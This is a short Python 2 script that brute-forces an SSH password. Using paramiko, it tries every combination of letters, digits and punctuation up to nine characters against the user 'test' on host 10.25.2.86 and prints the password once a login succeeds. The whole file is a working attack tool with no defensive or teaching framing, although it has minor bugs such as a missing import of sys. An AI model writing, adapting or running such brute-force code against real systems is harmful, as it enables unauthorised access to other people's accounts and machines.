import itertools
from itertools import product
import string
import time
import paramiko
import socket
host = '10.25.2.86'
username = 'test'
port = 22
chars = string.lowercase + string.uppercase + string.digits + string.punctuation
def ssh_connect(password, code = 0):
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	
	try:
		ssh.connect(host, port, username, password)
	except paramiko.AuthenticationException:
		#[*] Authentication Failed...
		code = 1
	except socket.error, e:
		#[*] Connection Failed ... Host Down
		code = 2
		
	ssh.close()
	return code

for x in range (10):
	for guess in itertools.product(chars, repeat=x):
		i = ''.join(guess)
		response = ssh_connect(i)
		
		if response == 0:
			print "\n\nPassword Found - " + i
			sys.exit(0)
		elif response == 1:
			print i + " - is not the password"
		elif response == 2:
			print "Connection could not be established"
			sys.exit(2)
	
